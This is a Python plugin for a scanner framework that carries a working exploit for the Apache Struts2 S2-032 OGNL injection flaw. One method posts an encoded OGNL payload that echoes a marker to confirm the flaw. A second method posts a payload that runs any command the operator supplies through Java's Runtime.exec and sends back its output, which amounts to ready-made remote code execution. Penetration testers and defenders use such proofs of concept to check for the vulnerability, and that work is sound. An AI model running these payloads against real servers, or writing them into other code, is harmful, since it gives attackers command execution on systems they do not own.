#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from lib.utils.connect import ClientSession
from script import Script, SERVICE_PORT_MAP, VUL_LEVEL, VUL_TYPE

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'Struts2-032'
        self.keyword = ['struts2', 'java']
        self.info = 'Struts2-032'
        self.type = VUL_LEVEL.CRITICAL
        self.level = VUL_TYPE.RCE
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.url != None:
            prove_poc = '''method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23w.print(%23parameters.web[0]),%23w.print(%23parameters.path[0]),%23w.close(),1?%23xx:%23request.toString&pp=%2f&encoding=UTF-8&web=struts2_security_vul&path=_str2016'''
            poc_key = "vul_str2016"
            async with ClientSession() as session:
                headers = {'Content-Type': "application/x-www-form-urlencoded"}
                async with session.post(url=self.url, data=prove_poc, headers=headers) as res:
                    if res:
                        text = await res.text()
                        if poc_key in text:
                            self.flag = 1
                            self.req.append({"poc": prove_poc})
                            self.res.append({"info": self.url, "key": 'struts2_032'})


    async def exec(self):
        await self.get_url()
        if self.url != None:
            cmd = self.parameter['cmd']
            exec_poc =  '''method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=%COMMAND%&pp=\\\\AAAA&ppp=%20&encoding=UTF-8'''
            headers = {}
            async with ClientSession() as session:
                headers["Content-Type"] = "application/x-www-form-urlencoded"
                async with session.post(url=self.url, params=exec_poc.replace("%COMMAND%", cmd)) as res:
                    if res:
                        text = await res.text()
                        self.flag = 1
                        self.req.append({"poc": exec_poc})
                        self.res.append({"info": text, "key": cmd})

